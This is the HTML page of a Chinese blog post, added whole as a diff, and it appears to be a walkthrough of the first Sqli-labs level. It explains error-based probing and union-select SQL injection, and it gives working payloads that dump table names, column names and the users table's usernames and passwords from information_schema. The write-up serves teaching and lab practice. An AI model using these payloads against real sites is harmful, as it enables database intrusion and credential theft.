@@ -1,0 +1,73 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="首先我们再url后面 添加?id&#x3D;1 ,发现页面变化且正常显示，说明我们输入的语句是可以被接受到的  我们再次输入?id&#x3D;1’ 发现出现报错，说明‘是没有被过滤掉的。且这个属于一个用’的字符型注入。就可以理解成，他让你输入的位置是‘内容’这个样子的，所以输入1的时候是正确的，但如果多输入一个‘它后面就会多出来一个’所以报错了。 如果在后面再加#就可以注释掉系统后面的代码，就又正">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLI DUMB SERIES-1">
+<meta property="og:url" content="http://example.com/2022/03/23/SQLI-DUMB-SERIES-1-0/index.html">
+<meta property="og:site_name" content="懒大王的主场">
+<meta property="og:description" content="首先我们再url后面 添加?id&#x3D;1 ,发现页面变化且正常显示，说明我们输入的语句是可以被接受到的  我们再次输入?id&#x3D;1’ 发现出现报错，说明‘是没有被过滤掉的。且这个属于一个用’的字符型注入。就可以理解成，他让你输入的位置是‘内容’这个样子的，所以输入1的时候是正确的，但如果多输入一个‘它后面就会多出来一个’所以报错了。 如果在后面再加#就可以注释掉系统后面的代码，就又正">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/008gHraJly8h0jp6e96k4j30sj0jrwgo.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/008gHraJly8h0jptq1ih2j30t50fzwgi.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/008gHraJly8h0jpvle4p8j30ol0jk40d.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/008gHraJly8h0k0103iinj30tp0amab5.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/008gHraJly8h0jpwqmzvqj30sy0g4764.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/008gHraJly8h0k0ouoeyij30ol0iu76j.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008gHraJly8h0k2dbo2i7j30ue0nqju3.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/008gHraJly8h0k1zws6v5j30ym0nsjuc.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/008gHraJly8h0k22ztfsqj318g0nsjvi.jpg">
+<meta property="article:published_time" content="2022-03-23T04:22:28.000Z">
+<meta property="article:modified_time" content="2022-03-24T13:36:31.642Z">
+<meta property="article:author" content="Sanyer">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="联合注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva4.sinaimg.cn/large/008gHraJly8h0jp6e96k4j30sj0jrwgo.jpg"><title>SQLI DUMB SERIES-1 | 懒大王的主场</title><link ref="canonical" href="http://example.com/2022/03/23/SQLI-DUMB-SERIES-1-0/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">懒大王的主场</div><div class="header-banner-info__subtitle">懒大王专场，舔羊勿进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">SQLI DUMB SERIES-1</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-23</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-24</span></span></div></header><div class="post-body"><p>首先我们再url后面 添加?id&#x3D;1 ,发现页面变化且正常显示，说明我们输入的语句是可以被接受到的</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0jp6e96k4j30sj0jrwgo.jpg" alt="img"></p>
+<p>我们再次输入?id&#x3D;1’ 发现出现报错，说明‘是没有被过滤掉的。且这个属于一个用’的字符型注入。就可以理解成，他让你输入的位置是<strong>‘内容’</strong>这个样子的，所以输入1的时候是正确的，但如果多输入一个‘它后面就会多出来一个’所以报错了。 如果在后面再加#就可以注释掉系统后面的代码，就又正常了。</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0jptq1ih2j30t50fzwgi.jpg" alt="img"></p>
+<p>当我们输入?id&#x3D;1’ and 1&#x3D;2%23 时，会发现回显错误。就说明我们的1&#x3D;2是已经注入进去了，因为很明显不对所以没用回显。或者也可输入?id&#x3D;1’and ‘1’&#x3D;’2可得出相同的结果。</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0jpvle4p8j30ol0jk40d.jpg" alt="img">![img](h</p>
+<p>接下来我们开始利用order by来分析就是前面这个id的表里面有几列。因为，在联合查询的时候，两个表的列数必须一样不然会报错，</p>
+<p>如果当你后面表列数不足的话，可以随便填一个值补上那一列</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0k0103iinj30tp0amab5.jpg" alt="img"></p>
+<p>然后我们利用?id&#x3D;-1’ union select 1,2,3%23  确认回显的位置(因为上面order by时到四不行了，所以前面这个表只有三行 )</p>
+<p>同时说明，如果select一个数的话，他是会直接把数显出来的，正好验证了上面所说的列数不够时随便用数凑。</p>
+<p>还有这里为什么是-1，其实只要是它实际id里没有的就行，不然第一个id就回显了。后面的select没地方显示了。-1的意义就是想办法把他弄到搜不到内容</p>
+<p>比如在?id&#x3D;1’后面接and 1&#x3D;2也是同样效果</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0jpwqmzvqj30sy0g4764.jpg" alt="img"></p>
+<p>我们已经找到了 2，3的地方可以显示数据。所以我们用这两个位置查询一下数据库的名称以及版本。我们可以根据版本选择接下来的注入方式。</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0k0ouoeyij30ol0iu76j.jpg" alt="img"></p>
+<p>接下来爆表名，?id&#x3D;1%27%20and%201&#x3D;2%20union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()<br>– 奥特光线&gt;—~~~~~~~~</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0k2dbo2i7j30ue0nqju3.jpg" alt="img"></p>
+<p>接下里爆列名，只要我们再拿到列名，我们就可以随便查看表里内容了。</p>
+<p>这里小偷一波懒，直接选择查看users表的信息，直接爆出users表的列名</p>
+<p>?id&#x3D;1%27%20and%201&#x3D;2%20union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’<br>– QaQ&gt;_&lt;</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0k1zws6v5j30ym0nsjuc.jpg" alt="img"></p>
+<p>接下来我们就可以爆出users表中的所有信息了</p>
+<p>?id&#x3D;1%27%20and%201&#x3D;2%20union select 1,2,group_concat(id,0x3a,username,0x3a,password,0x7e) from users<br>– ．&lt;{&#x3D;．．．．（嘎<del>嘎</del>嘎~）</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0k22ztfsqj318g0nsjvi.jpg" alt="img"></p>
+<p>只要重复上面的几步，爆出其他表的列名就可以爆出所有表的内容了</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/">联合注入</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/03/23/sql%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">sql基础知识</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/03/18/%E7%AC%94%E8%AE%B0/"><span class="paginator-prev__text">笔记</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.png" alt="avatar"></div><p class="sidebar-ov-author__text">世间本浑浊，罪与爱同歌</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">35</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">17</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Sanyer</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
